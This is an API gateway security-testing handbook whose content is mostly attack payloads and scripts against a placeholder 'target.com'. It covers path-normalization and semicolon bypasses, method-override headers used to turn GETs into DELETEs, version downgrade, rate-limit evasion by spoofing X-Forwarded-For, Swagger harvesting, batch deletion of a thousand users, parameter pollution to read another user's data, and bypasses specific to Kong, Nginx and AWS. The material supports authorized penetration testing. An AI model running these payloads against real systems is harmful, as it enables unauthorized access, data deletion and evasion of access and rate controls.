# API Gateway Security Testing Handbook

## 1. Path Normalization Bypass

### 1.1 Concept

```
The API gateway and the backend normalize paths differently

Gateway: /api/admin → access denied
Backend: /api/./admin → normalized to /api/admin → access allowed

Result: gateway access control bypassed
```

### 1.2 Common Payloads

```bash
# Dot-segment bypass
/api/./admin
/api/admin/.
/api/./admin/.

# Double slash
/api//admin
/api///admin

# URL encoding
/api/%2e/admin
/api/%2e%2e/admin
/api/%2f/admin

# Semicolon bypass (Spring Boot)
/api/;/admin
/api/admin;/

# Backslash (Windows)
/api\admin
/api\\admin

# Mixed
/api/.;/admin
/api/;./admin
/api/%2e;/admin
```

### 1.3 Test Script

```python
import requests

def test_path_normalization(base_url, protected_path):
    """Test path-normalization bypass"""
    
    payloads = [
        f"{protected_path}",
        f"./{protected_path}",
        f"{protected_path}/.",
        f"/{protected_path}",
        f"//{protected_path}",
        f"/{protected_path.replace('/', '%2f')}",
        f"/{protected_path.replace('/', '%2e/')}",
        f";/{protected_path}",
        f"{protected_path};/",
        f"/.;/{protected_path}",
    ]
    
    for payload in payloads:
        url = f"{base_url}{payload}"
        r = requests.get(url)
        
        print(f"[{r.status_code}] {payload}")
        
        if r.status_code == 200:
            print(f"    [!] possible bypass")
            print(f"    response length: {len(r.text)}")

# Usage example
test_path_normalization("https://target.com", "/api/admin")
```

---

## 2. HTTP Method Override

### 2.1 Concept

```
Some API gateways allow overriding the HTTP method via a request header

GET /api/user/123 → read-only, allowed
DELETE /api/user/123 → delete, denied

GET /api/user/123
X-HTTP-Method-Override: DELETE
→ the gateway sees GET and passes it through
→ the backend sees DELETE and performs the delete
```

### 2.2 Common Headers

```bash
X-HTTP-Method-Override: DELETE
X-Method-Override: DELETE
X-HTTP-Method: DELETE
X-Method: DELETE
_method: DELETE
```

### 2.3 Test Script

```bash
# Test method override
curl -X GET "https://target.com/api/user/123" \
  -H "X-HTTP-Method-Override: DELETE" \
  -H "Authorization: Bearer TOKEN"

curl -X POST "https://target.com/api/user/123" \
  -H "X-Method-Override: PUT" \
  -H "Content-Type: application/json" \
  -d '{"role": "admin"}'
```

---

## 3. API Version Downgrade

### 3.1 Concept

```
Old API versions may lack security checks

/v2/api/user → has an authorization check
/v1/api/user → no authorization check (deprecated but not removed)
```

### 3.2 Test Method

```bash
# Enumerate API versions
curl "https://target.com/v1/api/user"
curl "https://target.com/v2/api/user"
curl "https://target.com/v3/api/user"
curl "https://target.com/api/v1/user"
curl "https://target.com/api/v2/user"

# Test whether the old version is vulnerable
# 1. missing authorization check
# 2. insufficient input validation
# 3. known vulnerability unpatched
```

### 3.3 Automated Script

```python
def test_api_versions(base_url, endpoint):
    """Test API version downgrade"""
    
    versions = ["v1", "v2", "v3", "v4", "v5"]
    patterns = [
        f"/{{}}/{endpoint}",
        f"/{endpoint}/{{}}",
        f"/api/{{}}/{endpoint}",
        f"/api/{endpoint}/{{}}",
    ]
    
    for version in versions:
        for pattern in patterns:
            path = pattern.format(version)
            url = f"{base_url}{path}"
            
            r = requests.get(url)
            
            if r.status_code != 404:
                print(f"[{r.status_code}] {path}")
                
                # test whether there's an authorization check
                r_unauth = requests.get(url)  # without token
                if r_unauth.status_code == 200:
                    print(f"    [!] no authorization check")
```

---

## 4. Rate-Limit Bypass

### 4.1 X-Forwarded-For Rotation

```python
import requests
import random

def bypass_rate_limit_xff(url, count=100):
    """Bypass the rate limit by rotating X-Forwarded-For"""
    
    for i in range(count):
        # generate a random IP
        fake_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        
        headers = {
            "X-Forwarded-For": fake_ip,
            "X-Real-IP": fake_ip,
            "X-Originating-IP": fake_ip,
        }
        
        r = requests.get(url, headers=headers)
        print(f"[{i+1}] {fake_ip} → {r.status_code}")
        
        if r.status_code == 429:
            print("    rate limit still in effect")
            break
```

### 4.2 API Key Rotation

```python
def bypass_rate_limit_keys(url, api_keys):
    """Bypass the rate limit by rotating API keys"""
    
    for i, key in enumerate(api_keys):
        r = requests.get(url, headers={"X-API-Key": key})
        print(f"[{i+1}] Key {key[:10]}... → {r.status_code}")
```

### 4.3 Endpoint Variants

```bash
# Different endpoints for the same function may have separate rate limits

# Endpoint 1
curl "https://target.com/api/search?q=test"

# Endpoint 2 (same function)
curl "https://target.com/api/v2/search?q=test"
curl "https://target.com/search?q=test"
curl "https://target.com/api/query?keyword=test"
```

---

## 5. API Documentation Leaks

### 5.1 Common Paths

```bash
# Swagger / OpenAPI
/swagger.json
/swagger.yaml
/openapi.json
/openapi.yaml
/api-docs
/api-docs.json
/v2/api-docs
/v3/api-docs
/swagger-ui.html
/swagger-ui/
/api/swagger.json
/api/swagger-ui.html

# GraphQL
/graphql
/graphiql
/graphql/schema
/graphql/console

# RAML
/api.raml
/raml/api.raml

# API Blueprint
/api.apib
/apiary.apib

# WADL
/application.wadl
/api/application.wadl
```

### 5.2 Automated Scanning

```bash
# ffuf bulk detection
ffuf -u "https://target.com/FUZZ" \
  -w api-docs-paths.txt \
  -mc 200,301,302 \
  -o api-docs-results.json

# Extract API-doc URLs from JS files
grep -rE "(swagger|openapi|api-docs)" *.js
```

### 5.3 Leveraging the API Documentation

```python
import requests
import json

def exploit_swagger(swagger_url):
    """Extract all endpoints from the Swagger doc"""
    
    r = requests.get(swagger_url)
    swagger = r.json()
    
    base_path = swagger.get('basePath', '')
    paths = swagger.get('paths', {})
    
    endpoints = []
    
    for path, methods in paths.items():
        for method, details in methods.items():
            endpoint = {
                'path': base_path + path,
                'method': method.upper(),
                'summary': details.get('summary', ''),
                'parameters': details.get('parameters', []),
            }
            endpoints.append(endpoint)
    
    return endpoints

# Usage example
endpoints = exploit_swagger("https://target.com/swagger.json")

for ep in endpoints:
    print(f"{ep['method']} {ep['path']}")
    print(f"  {ep['summary']}")
    
    # test each endpoint
    # ...
```

---

## 6. Batch-Operation Abuse

### 6.1 Concept

```
Batch APIs may bypass per-record limits

Single: POST /api/user → rate limit 10/min
Batch: POST /api/users/batch → rate limit 10/min, but each call can process 100 records

Result: actually 1000 records/min
```

### 6.2 Test Method

```bash
# Find batch endpoints
/api/users/batch
/api/users/bulk
/api/users/import
/api/batch
/api/bulk

# Test batch operations
curl -X POST "https://target.com/api/users/batch" \
  -H "Content-Type: application/json" \
  -d '{
    "users": [
      {"id": 1, "action": "delete"},
      {"id": 2, "action": "delete"},
      ...
      {"id": 1000, "action": "delete"}
    ]
  }'
```

---

## 7. Parameter Pollution (HPP)

### 7.1 Concept

```
The gateway and the backend handle duplicate parameters differently

Request: /api/user?id=1&id=2

Gateway: takes the first id=1 → checks authorization (own ID) → passes
Backend: takes the last id=2 → returns another user's data

Result: unauthorized access
```

### 7.2 Test Method

```bash
# Duplicate parameters
curl "https://target.com/api/user?id=MY_ID&id=VICTIM_ID"

# Array parameters
curl "https://target.com/api/user?id[]=MY_ID&id[]=VICTIM_ID"

# JSON parameter pollution
curl -X POST "https://target.com/api/user" \
  -H "Content-Type: application/json" \
  -d '{"id": "MY_ID", "id": "VICTIM_ID"}'
```

---

## 8. Kong-Specific Bypasses

### 8.1 Path Normalization

```bash
# Kong's path handling
/api/admin → denied
/api/%61dmin → bypass (URL decoding)
/api/admin%2f → bypass (trailing slash)
```

### 8.2 Plugin Bypass

```bash
# Kong plugins may be misconfigured

# Test the JWT plugin
curl "https://target.com/api/protected" \
  -H "Authorization: Bearer invalid_token"

# Test the ACL plugin
curl "https://target.com/api/admin" \
  -H "X-Consumer-Groups: admin"
```

---

## 9. Nginx-Specific Bypasses

### 9.1 merge_slashes

```bash
# When Nginx merge_slashes is off
/api//admin → slashes not merged
/api///admin → may bypass rules
```

### 9.2 proxy_pass Misconfiguration

```nginx
# Misconfiguration
location /api/ {
    proxy_pass http://backend/;
}

# Request: /api/../admin
# Forwarded: http://backend/../admin → http://backend/admin
```

---

## 10. AWS API Gateway-Specific Bypasses

### 10.1 Resource-Policy Bypass

```bash
# Test the IP allowlist
curl "https://api-id.execute-api.region.amazonaws.com/prod/endpoint" \
  -H "X-Forwarded-For: allowed-IP"
```

### 10.2 Lambda Authorizer Bypass

```bash
# Test the authorizer logic
curl "https://api-id.execute-api.region.amazonaws.com/prod/endpoint" \
  -H "Authorization: Bearer malformed_token"

# Watch the error messages; they may leak the authorization logic
```

---

## 11. Testing Tools

### Arjun (parameter discovery)

```bash
# Install
pip3 install arjun

# Discover hidden parameters
arjun -u https://target.com/api/user

# May reveal: debug=1, internal=1, admin=true
```

### Kiterunner (API endpoint discovery)

```bash
# Install
go install github.com/assetnote/kiterunner@latest

# Scan API endpoints
kr scan https://target.com -w routes.txt

# Use the Assetnote wordlist
kr scan https://target.com -A=apiroutes-210228
```

